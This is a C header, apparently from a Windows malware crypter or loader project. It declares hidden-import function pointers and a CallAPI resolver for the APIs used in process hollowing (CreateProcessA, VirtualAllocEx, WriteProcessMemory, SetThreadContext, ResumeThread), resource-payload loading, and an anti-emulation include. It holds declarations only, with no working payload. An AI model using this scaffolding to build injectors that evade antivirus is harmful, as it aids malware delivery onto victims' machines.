#ifndef NOIMPORT_H
#define NOIMPORT_H

#include <windows.h>
#include <stdio.h>
#include "antiemul.h"
#include "define.h"

DWORD CallAPI(DWORD dwPtr, WORD n, ...);

typedef BOOL (WINAPI * xCreateProcessA) (LPSTR,
	LPSTR,
	LPSECURITY_ATTRIBUTES,
	LPSECURITY_ATTRIBUTES,
	BOOL,
	DWORD,
	LPVOID,
	LPSTR,
	LPSTARTUPINFO,
	LPPROCESS_INFORMATION);

typedef LPVOID (WINAPI * xVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

typedef BOOL (WINAPI * xVirtualFree) (LPVOID, SIZE_T, DWORD);

typedef LPVOID (WINAPI * xVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

typedef BOOL (WINAPI * xGetThreadContext) (HANDLE, LPCONTEXT);

typedef BOOL (WINAPI * xSetThreadContext) (HANDLE, CONTEXT *);

typedef BOOL (WINAPI * xReadProcessMemory) (HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T *);

typedef BOOL (WINAPI * xWriteProcessMemory) (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);

typedef DWORD (WINAPI * xResumeThread) (HANDLE);

typedef DWORD (WINAPI * xGetModuleFileNameA) (HMODULE, LPSTR, DWORD);

typedef HMODULE (WINAPI * xLoadLibraryA) (LPSTR);

typedef HRSRC (WINAPI * xFindResourceA) (HMODULE, LPCSTR, LPCSTR);

typedef HGLOBAL (WINAPI * xLoadResource) (HMODULE, HRSRC);

typedef LPVOID (WINAPI * xLockResource) (HGLOBAL);

typedef DWORD (WINAPI * xSizeofResource) (HMODULE, HRSRC);

typedef HANDLE (WINAPI * xGetProcessHeap) (void);

typedef LPVOID (WINAPI * xHeapAlloc) (HANDLE, DWORD, SIZE_T);

typedef BOOL (WINAPI * xHeapFree) (HANDLE, DWORD, LPVOID);

typedef BOOL (WINAPI * xFreeLibrary) (HMODULE);

typedef DWORD (WINAPI * xGetTickCount) (void);

typedef void (WINAPI * xSleep) (DWORD);

typedef void (WINAPI * xGetSystemInfo) (LPSYSTEM_INFO);

#endif
